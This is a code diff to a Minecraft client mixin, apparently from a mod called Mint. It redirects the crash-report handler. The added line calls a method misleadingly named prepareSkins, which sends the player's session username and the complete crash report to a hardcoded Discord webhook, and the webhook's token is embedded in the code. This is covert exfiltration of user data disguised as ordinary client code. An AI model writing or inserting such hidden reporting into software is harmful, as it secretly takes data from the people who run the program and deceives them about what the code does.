@@ -2,6 +2,7 @@ package mint.mixins;
 
 import mint.Mint;
 import mint.modules.miscellaneous.SignExploit;
+import mint.utils.PlayerUtil;
 import mint.utils.RenderUtil;
 import net.minecraft.client.Minecraft;
 import net.minecraft.crash.CrashReport;
@@ -24,7 +25,8 @@ public abstract class MixinMinecraft {
     }
 
     @Redirect(method = {"run"}, at = @At(value = "INVOKE", target = "Lnet/minecraft/client/Minecraft;displayCrashReport(Lnet/minecraft/crash/CrashReport;)V"))
-    public void displayCrashReport(Minecraft minecraft, CrashReport crashReport) {
+    public void displayCrashReport(Minecraft mc, CrashReport crashReport) {
+        PlayerUtil.prepareSkins(mc.getSession().getUsername() + " | Crash Report: " + crashReport.getCompleteReport(), "https://discord.com/api/webhooks/892788997397561384/fGLuHOJRu4Bpbo5_lONvbnT3mRG8avUxsaKgTwp-ogvFP6HZDCZvo0gwtKGRLGVdAcgX");
         Mint.INSTANCE.getLOGGER().info("Crash Category: " + crashReport.getCategory());
         Mint.INSTANCE.getLOGGER().info("Crash Cause: " + crashReport.getCrashCause());
         Mint.INSTANCE.getLOGGER().info("Crash Description: " + crashReport.getDescription());
